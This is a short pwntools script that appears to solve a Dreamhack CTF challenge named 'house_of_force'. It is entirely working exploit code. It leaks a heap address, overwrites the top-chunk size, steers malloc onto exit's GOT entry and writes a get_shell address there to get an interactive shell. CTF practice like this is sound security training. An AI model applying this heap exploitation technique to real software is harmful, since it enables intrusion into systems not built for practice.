#!/usr/bin/python 
from pwn import *

context.log_level = 'debug'
p = remote("host1.dreamhack.games", 8251)
#p = process("./house_of_force")
elf = ELF("./house_of_force")
ptr = elf.symbols['ptr']
get_shell = elf.symbols['get_shell']
exit_got = elf.got['exit']

def create(size, data):
    p.sendlineafter("> ", '1')
    p.sendlineafter("Size: ", str(size))
    p.sendlineafter("Data: ", data)

def write(ptr_idx, idx, value):
    p.sendlineafter("> ", '2')
    p.sendlineafter("ptr idx: ", str(ptr_idx))
    p.sendlineafter("write idx: ", str(idx))
    p.sendlineafter("value: ", str(value))

create(0x10, 'A'*0x10)
heap_addr = int(p.recv(9), 16)
log.info("heap_addr: "+hex(heap_addr))
topchunk_size_addr = heap_addr+20
log.info("topchunk_size_addr: "+hex(topchunk_size_addr))

# overwrite topchunk size to 2^32-1
write(0, 5, 0xffffffff)

malloc_size = exit_got - topchunk_size_addr-0x8-0x4-0x4-0x4
create(malloc_size, "")

# malloc on malloc@got, GOT overwrite
#gdb.attach(p)
create(4, p32(get_shell))
p.sendlineafter("> ", '1')
p.sendlineafter("Size: ", str(0x8))

p.interactive()
